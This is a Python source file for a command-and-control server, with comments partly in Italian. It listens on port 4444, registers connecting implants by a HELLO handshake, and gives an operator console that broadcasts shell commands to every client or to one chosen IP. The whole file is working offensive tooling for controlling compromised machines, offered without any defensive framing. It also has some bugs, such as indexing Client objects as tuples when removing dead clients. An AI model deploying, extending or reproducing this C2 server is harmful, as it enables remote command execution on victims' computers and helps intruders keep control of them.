#!/usr/bin/env python3
import socket
import threading
import time
import sys
from Client import Client

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = [] # Client(socket, address, hostname, last_seen)
        self.lock = threading.Lock()
        self.running = True
    
    def handle_client(self, client_socket, address):
        """Gestisce una connessione client"""
        ip, port = address
        client_id = f"{ip}:{port}"

        # Send only handshake if client already exists
        for existing_client in self.clients:
            if existing_client.ip == ip:
                existing_client.socket = client_socket
                existing_client.socket.send(b"READY\n")
                return
        
        try:
            print(f"[+] Client connected: {client_id}")
            
            # 1. Ricevi handshake (CON TIMEOUT)
            client_socket.settimeout(5.0)
            try:
                data = client_socket.recv(1024).decode().strip()
                print(f"[+] Handshake received: {data}")
                
                if not data.startswith("HELLO|"):
                    print(f"[-] Bad handshake from {client_id}")
                    client_socket.close()
                    return
                
                # Estrai hostname
                parts = data.split('|')
                hostname = parts[1] if len(parts) > 1 else "unknown"
                
            except socket.timeout:
                print(f"[-] {client_id} handshake timeout")
                client_socket.close()
                return
            
            # 2. Invia READY (IMPORTANTE: il client lo aspetta!)
            print(f"[+] Sending READY to {client_id}")
            client_socket.send(b"READY\n")
            
            # 3. Registra client
            with self.lock:
                self.clients.append(Client(client_socket, address, hostname, time.time()))
            
            print(f"[+] Client registered: {client_id} ({hostname})")
            print(f"[+] Total clients: {len(self.clients)}")
            
            # 4. Loop per ricevere risposte ai comandi
            while self.running:
                try:
                    # Ricevi risposte (timeout breve 0.5 o più alto)
                    client_socket.settimeout(1.0)
                    try:
                        data = client_socket.recv(8192)
                        if data:
                            # Questa è una risposta a un comando broadcast
                            output = data.decode('utf-8', errors='ignore').rstrip()
                            print(f"[{client_id}] Response: {output[:100]}...")
                            
                            # Aggiorna last_seen
                            with self.lock:
                                for client in self.clients:
                                    if client.socket == client_socket:
                                        client.set_time(time.time())
                                        break
                    except socket.timeout:
                        continue  # Nessun dato, continua
                    except:
                        break  # Errore, esci
                        
                except Exception as e:
                    print(f"[-] {client_id} error in loop: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] {client_id} error: {e}")
        finally:
            # Rimuovi client
            with self.lock:
                self.clients = [c for c in self.clients if c.socket != client_socket]
            
            try:
                client_socket.close()
            except:
                pass
            
            print(f"[-] Client disconnected: {client_id}")
            print(f"[-] Remaining clients: {len(self.clients)}")
    
    def broadcast_command(self, command):
        """Invia comando a tutti i client"""
        results = []
        dead_clients = []
        
        with self.lock:
            clients_copy = self.clients.copy()
        
        print(f"\n[*] Broadcasting '{command}' to {len(clients_copy)} clients")
        
        for client_copy in clients_copy: #client_socket, address, hostname, _
            client_id = f"{client_copy.ip}:{client_copy.port}"
            
            try:
                print(f"  -> Sending to {client_id}...")
                client_copy.socket.send((command + '\n').encode())
                results.append((client_id, client_copy.hostname, "SENT"))
                
            except Exception as e:
                print(f"  x Failed to send to {client_id}: {e}")
                dead_clients.append(client_copy.socket)
                results.append((client_id, client_copy.hostname, f"ERROR: {e}"))
        
        # Rimuovi client morti
        for client_socket in dead_clients:
            with self.lock:
                self.clients = [c for c in self.clients if c[0] != client_socket]
        
        return results

    def client_command(self, ip, command):
        target = None
        result = None
        dead = None

        for client in self.clients:
            if client.ip == ip:
                target = client
        if target is None:
            print("[ERR:] Please specify a valid client IP. Use list command to see all avilabe clients")

        print(f"\n[*] Sending '{command}' to {target.ip}")

        client_id = f"{target.ip}:{target.port}"
        try:
            print(f"  -> Sending to {client_id}...")
            target.socket.send((command + '\n').encode())
            result = (client_id, target.hostname, "SENT")

        except Exception as e:
            print(f"  x Failed to send to {client_id}: {e}")
            dead = target.socket
            result = (client_id, target.hostname, f"ERROR: {e}")

        # Rimuovi client morti
        if dead is not None:
            with self.lock:
                self.clients.remove(target)

        return [result]

    
    def console(self):
        """Console interattiva"""
        print("\n" + "="*60)
        print("C2 SERVER - Type commands and press ENTER")
        print("Commands: list, broadcast <cmd>, exit")
        print("Example: broadcast whoami")
        print("="*60)
        
        while self.running:
            try:
                cmd = input("\nC2> ").strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() == 'exit':
                    print("[*] Shutting down server...")
                    self.running = False
                    break
                
                elif cmd.lower() == 'list':
                    with self.lock:
                        if not self.clients:
                            print("[!] No clients connected")
                        else:
                            print(f"\nConnected clients ({len(self.clients)}):")
                            for i, client in enumerate(self.clients):
                                idle = int(time.time() - client.last_seen)
                                print(f"  {i+1}. {client.ip}:{client.port} - {client.hostname} (idle: {idle}s)")
                
                elif cmd.lower().startswith('broadcast '):
                    command = cmd[10:].strip() # Extract command (len "broadcast "= 10)
                    if not command:
                        print("[ERR:] Specify a command")
                        continue
                    
                    results = self.broadcast_command(command)
                    
                    print(f"\n[*] Command sent to {len(results)} clients")
                    print("[*] Responses will appear above as they arrive")
                    print("[*] Type 'list' to see updated client status")

                elif cmd.lower().startswith('client '):
                    ip_com = cmd[7:].strip()
                    ip_com_index = ip_com.index(' ')
                    ip = ip_com[:ip_com_index].strip()
                    command = ip_com[ip_com_index:].strip()

                    if not ip or not command:
                        print("[ERR:] specify an IP and a command")
                        continue
                    results = self.client_command(ip, command)
                    print("[*] Responses will appear above as it arrives")

                
                else:
                    print(f"[!] Unknown command: {cmd}")
                    print("    Available: list, broadcast <cmd>, client <ip> <cmd>, exit")
                    
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting...")
                self.running = False
                break
    
    def start(self):
        """Avvia il server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(10)
        
        print(f"[*] C2 Server started on {self.host}:{self.port}")
        print("[*] Waiting for clients to connect...")
        
        # Thread per accettare connessioni
        def accept_loop():
            while self.running:
                try:
                    client_socket, address = server.accept()
                    thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    thread.start()
                except:
                    break  # Server chiuso
        
        accept_thread = threading.Thread(target=accept_loop, daemon=True)
        accept_thread.start()
        
        # Avvia console
        self.console()
        
        # Cleanup
        self.running = False
        server.close()
        print("[*] Server stopped")


if __name__ == "__main__":
    server = C2Server()
    server.start()
